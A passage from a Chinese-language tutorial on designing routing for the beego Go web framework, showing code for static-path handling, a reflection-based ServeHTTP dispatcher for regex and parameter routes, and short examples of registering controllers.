    StaticDir[url] = path
    return app
}
```
应用中设置静态路径可以使用如下方式实现：


beego.SetStaticPath("/img","/static/img")
转发路由
转发路由是基于 ControllerRegistor 里的路由信息来进行转发的，详细的实现如下代码所示：

```go
// AutoRoute
func (p *ControllerRegistor) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    defer func() {
        if err := recover(); err != nil {
            if !RecoverPanic {
                // go back to panic
                panic(err)
            } else {
                Critical("Handler crashed with error", err)
                for i := 1; ; i += 1 {
                    _, file, line, ok := runtime.Caller(i)
                    if !ok {
                        break
                    }
                    Critical(file, line)
                }
            }
        }
    }()
    var started bool
    for prefix, staticDir := range StaticDir {
        if strings.HasPrefix(r.URL.Path, prefix) {
            file := staticDir + r.URL.Path[len(prefix):]
            http.ServeFile(w, r, file)
            started = true
            return
        }
    }
    requestPath := r.URL.Path

    //find a matching Route
    for _, route := range p.routers {

        // check if Route pattern matches url
        if !route.regex.MatchString(requestPath) {
            continue
        }

        // get submatches (params)
        matches := route.regex.FindStringSubmatch(requestPath)

        // double check that the Route matches the URL pattern.
        if len(matches[0]) != len(requestPath) {
            continue
        }

        params := make(map[string]string)
        if len(route.params) > 0 {
            // add url parameters to the query param map
            values := r.URL.Query()
            for i, match := range matches[1:] {
                values.Add(route.params[i], match)
                params[route.params[i]] = match
            }

            // reassemble query params and add to RawQuery
            r.URL.RawQuery = url.Values(values).Encode() + "&" + r.URL.RawQuery
            // r.URL.RawQuery = url.Values(values).Encode()
        }
        // Invoke the request handler
        vc := reflect.New(route.controllerType)
        init := vc.MethodByName("Init")
        in := make([]reflect.Value, 2)
        ct := &Context{ResponseWriter: w, Request: r, Params: params}
        in[0] = reflect.ValueOf(ct)
        in[1] = reflect.ValueOf(route.controllerType.Name())
        init.Call(in)
        in = make([]reflect.Value, 0)
        method := vc.MethodByName("Prepare")
        method.Call(in)
        if r.Method == "GET" {
            method = vc.MethodByName("Get")
            method.Call(in)
        } else if r.Method == "POST" {
            method = vc.MethodByName("Post")
            method.Call(in)
        } else if r.Method == "HEAD" {
            method = vc.MethodByName("Head")
            method.Call(in)
        } else if r.Method == "DELETE" {
            method = vc.MethodByName("Delete")
            method.Call(in)
        } else if r.Method == "PUT" {
            method = vc.MethodByName("Put")
            method.Call(in)
        } else if r.Method == "PATCH" {
            method = vc.MethodByName("Patch")
            method.Call(in)
        } else if r.Method == "OPTIONS" {
            method = vc.MethodByName("Options")
            method.Call(in)
        }
        if AutoRender {
            method = vc.MethodByName("Render")
            method.Call(in)
        }
        method = vc.MethodByName("Finish")
        method.Call(in)
        started = true
        break
    }

    // if no matches to url, throw a not found exception
    if started == false {
        http.NotFound(w, r)
    }
}
```
#### 使用入门
基于这样的路由设计之后就可以解决前面所说的三个限制点，使用的方式如下所示：

基本的使用注册路由：


beego.BeeApp.RegisterController("/", &controllers.MainController{})
参数注册：


beego.BeeApp.RegisterController("/:param", &controllers.UserController{})
正则匹配：


beego.BeeApp.RegisterController("/users/:uid([0-9]+)", &controllers.UserController{})


